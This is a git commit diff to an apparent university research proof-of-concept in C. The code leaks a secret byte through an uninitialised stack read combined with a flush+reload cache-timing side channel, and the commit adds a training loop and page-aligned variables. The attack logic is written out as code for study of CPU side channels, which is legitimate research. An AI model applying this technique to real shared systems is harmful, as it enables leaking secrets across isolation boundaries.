29ebc86614722271d6535b42ad4dac2cb5d8d249
Chris Wagenaar <c.c.j.wagenaar@student.vu.nl>
2023-06-16 16:00:28 +0200

    uninitialized read: aligned memory addresses

--- unititialized_read/uninit_read3.c
+++ unititialized_read/uninit_read3.c
@@ -17,33 +17,41 @@
 #define DBG 0
 #define MALLOC_SIZE 4096
 
+#define ALIGNED_SIZE 4096
+
 cp_t* flush_reload_arr;
+volatile cp_t cp;   //cache page declared out of function to keep stack identical to init_func()
 
 __attribute__((noinline)) void init_func(int val) {
-    volatile char __attribute__ ((aligned (256))) x = val;
-    printf("init  \t%p:\t%d\n", &x, x);
+    cp = flush_reload_arr[1];
+    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x = val;
+    //printf("init  \t%p:\t%d\n", &x, x);
 }
 
-__attribute__((noinline)) void uninit_func(int val) {
-    volatile char __attribute__ ((aligned (256))) x;
-    volatile cp_t cp = flush_reload_arr[x];
-    printf("uninit\t%p:\t%d\n", &x, x);
-    //volatile int cpy = val;
+__attribute__((noinline)) void uninit_func() {
+    cp = flush_reload_arr[0];
+    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x;
+    cp = flush_reload_arr[x];
+    //printf("uninit\t%p:\t%d\n", &x, x);
 }
 
-static inline void victim_func() {
+//static inline void victim_func(char init) {
+__attribute__((noinline)) void victim_func(char init) {
     int val = 5;
 
-    flush((void*)&val);
+    //flush((void*)&val);
+    flush((void*)&init);
     cpuid();
-    init_func(val);
-    uninit_func(0);
+
+    if(init==1) init_func(val);
+    else if (init==0) {uninit_func();}
+    else cp = flush_reload_arr[2];
 
 }
 
 void touch_secret(int secret_index) {
-    volatile char __attribute__ ((aligned (256))) s = SECRET[secret_index];
-    printf("secret\t%p:\t%d\n", &s, s);
+    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) s = SECRET[secret_index];
+    //printf("secret\t%p:\t%d\n", &s, s);
 }
 
 int* prepare(int secret_index) {
@@ -51,45 +59,44 @@ int* prepare(int secret_index) {
     flush_reload_arr = init_flush_reload(N_PAGES);
     flush_arr((void*)flush_reload_arr, N_PAGES);
     cpuid();
-    int val = 5;
+
 
     //NO IDEA WHY I NEED THIS
-    int n_accesses = 1;
-    char secret_indices[n_accesses];
+    int n_accesses = N_TRAINING + 1;
+    char init_indices[n_accesses];
     //END OF WEIRD SECTION
+    for(int i = 0; i < n_accesses; i++) init_indices[i] = false;
+    init_indices[n_accesses-1] = true;
 
+    for(int i = 0; i < n_accesses; i++) {
+        touch_secret(secret_index);
+        victim_func(init_indices[i]);
+
+        if(init_indices[i] == false) {
+            cpuid();
+            flush_arr((void*)flush_reload_arr, N_PAGES);
+        }
+
+    }
+
+
+    /*cpuid();
+    flush_arr((void*)flush_reload_arr, N_PAGES);
     //TOUCH SECRET START
     touch_secret(secret_index);
-    /*if(secret_index <= SECRET_SIZE) {   //IF TRUE
-        volatile char s = SECRET[secret_index];
-        printf("secret\t%p:\t%d\n", &s, s);
-    }//*/
- 
     //TOUCH SECRET END
     cpuid();
 
     //VICTIM FUNC START
-
+    victim_func(2);
+    /*int val = 5;
     flush((void*)&val);
     cpuid();
     init_func(val);
-    uninit_func(0);//*/
-
-    /*if(secret_index <= SECRET_SIZE) {   //IF TRUE
-
-        volatile char x = val;
-        printf("init  \t%p:\t%d\n", &x, x);
-    }
-
-    if(secret_index <= SECRET_SIZE) {   //IF TRUE
-        volatile char x;
-        volatile cp_t cp = flush_reload_arr[x];
-        printf("uninit\t%p:\t%d\n", &x, x);
-    }//*/
-    
+    uninit_func();//*/
     //VICTIM FUNC END
-    cpuid();
 
+    cpuid();
     //time loading duration per array index
     int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
     unmap_cache_pages(flush_reload_arr, N_PAGES);
